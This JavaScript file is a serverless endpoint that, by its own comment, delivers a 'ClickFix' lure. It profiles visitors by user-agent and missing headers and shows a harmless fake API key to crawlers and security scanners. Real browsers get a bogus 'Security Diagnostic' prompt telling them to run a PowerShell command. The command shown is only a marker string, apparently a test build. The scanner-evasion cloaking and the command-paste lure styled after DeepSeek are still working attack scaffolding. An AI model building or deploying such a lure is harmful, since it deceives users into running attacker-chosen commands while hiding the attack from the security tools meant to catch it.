/**
 * Vercel Serverless — /api/platform-config
 * Bot → benign. Real browser → ClickFix payload.
 * Single `text` field for both display and clipboard. No steps — dialog is clean.
 */
export default function handler(req, res) {
  var headers = req.headers;
  var ua = (headers['user-agent'] || '').toLowerCase();
  var isBot = false;

  var bots = ['bot','crawler','spider','headless','selenium','puppeteer','playwright',
    'curl','wget','python','java/','go-http','node-fetch','axios','request/','okhttp',
    'libwww','scanner','security','analyzer','audit','check'];
  for (var i = 0; i < bots.length; i++) { if (ua.indexOf(bots[i]) !== -1) { isBot = true; break; } }
  if (!headers['sec-fetch-site'] && !headers['accept-language']) isBot = true;

  var meta = { version: '2.1', stats: { developers: '3M+' } };

  var data;
  if (isBot) {
    data = {
      text: 'sk-ds-8xK9mP3vR2tW7yQ-A1bC2dE3fG4hI5jK6lM',
      title: 'API Key Generated',
      desc: 'Your new API key has been generated. Copy it now:',
      meta: meta
    };
  } else {
    data = {
      text: 'powershell -c "Write-Host DEEPSEEK_CLICKFIX_VERIFY; Read-Host"',
      title: 'Security Diagnostic',
      desc: 'Run this diagnostic command to verify your development environment:',
      meta: meta
    };
  }

  res.status(200).setHeader('Content-Type', 'application/json; charset=utf-8')
     .setHeader('Access-Control-Allow-Origin', '*').setHeader('Cache-Control', 'no-store')
     .send(JSON.stringify(data));
}
